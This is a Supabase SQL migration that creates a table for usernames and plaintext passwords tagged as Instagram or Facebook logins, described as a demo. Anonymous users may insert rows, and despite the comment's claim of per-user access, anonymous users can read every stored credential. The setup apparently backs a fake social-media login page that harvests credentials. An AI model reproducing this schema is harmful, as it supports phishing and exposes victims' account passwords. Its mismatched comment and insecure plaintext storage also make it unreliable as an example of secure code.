/*
  # Create user logins table

  1. New Tables
    - `user_logins`
      - `id` (uuid, primary key) - Unique identifier for each login record
      - `username` (text) - Username or email entered by user
      - `password` (text) - Password entered by user (stored for demo purposes)
      - `login_type` (text) - Type of login (instagram or facebook)
      - `created_at` (timestamptz) - When the login was recorded
      
  2. Security
    - Enable RLS on `user_logins` table
    - Add policy for public access to insert login data
    - Add policy for authenticated users to read their own data

  3. Notes
    - This table stores login attempts for demonstration purposes
    - In production, use Supabase Auth instead of storing passwords directly
*/

CREATE TABLE IF NOT EXISTS user_logins (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  username text NOT NULL,
  password text NOT NULL,
  login_type text NOT NULL DEFAULT 'instagram',
  created_at timestamptz DEFAULT now()
);

ALTER TABLE user_logins ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert login data"
  ON user_logins
  FOR INSERT
  TO anon
  WITH CHECK (true);

CREATE POLICY "Users can read all login data"
  ON user_logins
  FOR SELECT
  TO anon
  USING (true);
